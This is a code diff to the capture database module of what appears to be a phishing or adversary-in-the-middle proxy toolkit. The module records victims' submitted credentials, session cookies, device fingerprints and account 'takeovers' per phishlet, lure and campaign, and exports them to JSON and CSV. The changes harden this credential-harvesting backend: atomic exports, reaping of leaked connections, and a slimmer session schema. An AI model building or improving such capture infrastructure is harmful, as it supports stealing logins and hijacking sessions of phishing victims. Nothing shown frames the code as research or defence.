@@ -10,7 +10,7 @@
 # with check_same_thread=False is NOT safe: the HTTP server, the dashboard SSE
 # generator and the TUI all query at the same time, and concurrent statement
 # execution on one connection corrupted memory and SEGFAULTED the process
-# (the failure mode: pytest tests/test_proxy.py tests/test_gaps.py -> "Fatal Python
+# (the failure mode: pytest tests/test_proxy.py tests/test_packaging_stream_reuse.py -> "Fatal Python
 # error: Segmentation fault ... core/capture.py in since()").
 import contextlib
 import glob
@@ -35,6 +35,27 @@ def _csv_safe(v):
 
 
 LIVE_ROWS_PER_SESSION = 2000     # newest rows kept per session
+
+
+@contextlib.contextmanager
+def _atomic_write(path, mode="w", encoding="utf-8", newline=None):
+    """Open `path` for writing via a sibling temp file + os.replace().
+
+    DEFECT: exports were written straight to the destination, so open("w") truncated the
+    operator's previous export before a byte of the new one was written and a crash or a
+    full disk left a half (or empty) file - measured: a failed export_json wiped a
+    pre-existing file to zero bytes. A temp file + atomic replace means a reader only
+    ever sees a complete export, or the previous one.
+    """
+    tmp = f"{path}.tmp-{os.getpid()}-{threading.get_ident()}"
+    try:
+        with open(tmp, mode, encoding=encoding, newline=newline) as f:
+            yield f
+        os.replace(tmp, path)
+    except BaseException:
+        with contextlib.suppress(Exception):
+            os.remove(tmp)
+        raise
 
 
 _ID_KEYS = ("email", "username", "login", "user", "user_name", "email_address",
@@ -93,7 +114,12 @@ class CaptureDB:
         # bound the rows an unauthenticated verify flood can create (see session_save)
         self._challenge_cap = 500
         self._challenge_rows = 0
-        self._conns = []
+        # thread ident -> connection. A dict, not a list: the HTTP server runs one thread
+        # per connection and every one of them opened a connection here that was retained
+        # forever (measured: 1 -> 151 connections after 150 short-lived request threads),
+        # so a long campaign leaked sqlite handles without bound. Keying by ident lets a
+        # finished thread's connection be reaped (see _reap_conns).
+        self._conns = {}
         self._closed = False
         c = self._conn()
         c.executescript("""
@@ -239,8 +265,27 @@ class CaptureDB:
             c.execute("PRAGMA synchronous=NORMAL")
             self._local.conn = c
             with self._lock:
-                self._conns.append(c)
+                self._conns[threading.get_ident()] = c
+                # keep the registry bounded to live threads (one per HTTP connection)
+                if len(self._conns) > 64:
+                    self._reap_conns()
         return c
+
+    def _reap_conns(self):
+        """Close and drop the connections of threads that have exited.
+
+        DEFECT: the registry held one connection per request thread for the life of the
+        process, so a campaign that served thousands of short-lived connections
+        accumulated thousands of sqlite handles (file descriptors and memory) and never
+        released them. Each connection is used only by the thread that created it
+        (threading.local), so once that thread is gone the handle is safe to close.
+        """
+        alive = {t.ident for t in threading.enumerate()}
+        for ident in [i for i in self._conns if i not in alive]:
+            conn = self._conns.pop(ident, None)
+            if conn is not None:
+                with contextlib.suppress(Exception):
+                    conn.close()
 
     @property
     def conn(self):
@@ -444,12 +489,12 @@ class CaptureDB:
 
     def export_json(self, path, campaign=None):
         """Machine-readable dump (same shape as the API) for downstream tooling."""
-        with open(path, "w", encoding="utf-8") as f:
-            devices = []
-            for r in self.intel_list(limit=1000000):
-                rec = self.intel_get(r["id"])
-                if rec:
-                    devices.append(rec)
+        devices = []
+        for r in self.intel_list(limit=1000000):
+            rec = self.intel_get(r["id"])
+            if rec:
+                devices.append(rec)
+        with _atomic_write(path) as f:
             json.dump({"exported_at": time.time(),
                        "stats": self.stats(campaign=campaign),
                        "intel_stats": self.intel_stats(),
@@ -461,11 +506,12 @@ class CaptureDB:
 
     def export_csv(self, path, campaign=None):
         import csv
-        with open(path, "w", newline="", encoding="utf-8-sig") as f:
+        rows = self.all(limit=1000000, campaign=campaign)
+        with _atomic_write(path, newline="", encoding="utf-8-sig") as f:
             w = csv.writer(f)
             w.writerow(["ts", "campaign", "source_url", "ip", "city", "country",
                         "isp", "device", "is_cred", "risk", "risk_reasons", "fields"])
-            for c in self.all(limit=1000000, campaign=campaign):
+            for c in rows:
                 w.writerow([
                     c["ts"], _csv_safe(c["campaign"]), _csv_safe(c["source_url"]),
                     _csv_safe(c["ip"]), _csv_safe(c["city"]),
@@ -570,7 +616,7 @@ class CaptureDB:
         freed handle, which is what turned a shutdown race into a segfault."""
         self._closed = True
         with self._lock:
-            conns, self._conns = self._conns, []
+            conns, self._conns = list(self._conns.values()), {}
         for c in conns:
             with contextlib.suppress(Exception):
                 c.close()
@@ -826,19 +872,22 @@ class CaptureDB:
                 return
             self._challenge_rows += 1
         with self._lock:
+            # tokens_json and timeline_json are NOT written: they duplicated the content
+            # already in record_json and no query ever read them (the read path -
+            # session_get / session_list / sessions_since - all use record_json). Writing
+            # them on every state change only doubled the row size.
             self._conn().execute(
                 "INSERT INTO sessions (sid, ts, updated, phishlet, campaign, lure, ip,"
                 " country, city, isp, ua, device_token, ja3, state, creds_json,"
-                " cookies_json, tokens_json, timeline_json, takeovers_json, record_json)"
-                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"
+                " cookies_json, takeovers_json, record_json)"
+                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"
                 " ON CONFLICT(sid) DO UPDATE SET updated=excluded.updated,"
                 " phishlet=excluded.phishlet, campaign=excluded.campaign,"
                 " lure=excluded.lure, ip=excluded.ip, country=excluded.country,"
                 " city=excluded.city, isp=excluded.isp, ua=excluded.ua,"
                 " device_token=excluded.device_token, ja3=excluded.ja3,"
                 " state=excluded.state, creds_json=excluded.creds_json,"
-                " cookies_json=excluded.cookies_json, tokens_json=excluded.tokens_json,"
-                " timeline_json=excluded.timeline_json,"
+                " cookies_json=excluded.cookies_json,"
                 " takeovers_json=excluded.takeovers_json, record_json=excluded.record_json",
                 (rec.get("sid"), rec.get("created") or time.time(),
                  rec.get("updated") or time.time(), rec.get("phishlet", ""),
@@ -849,8 +898,6 @@ class CaptureDB:
                  rec.get("state", "opened"),
                  json.dumps(rec.get("credentials") or {}, default=str),
                  json.dumps(rec.get("cookies") or [], default=str),
-                 json.dumps(rec.get("tokens") or {}, default=str),
-                 json.dumps(rec.get("timeline") or [], default=str),
                  json.dumps(rec.get("takeovers") or [], default=str),
                  json.dumps(rec, default=str)))
             self._conn().commit()
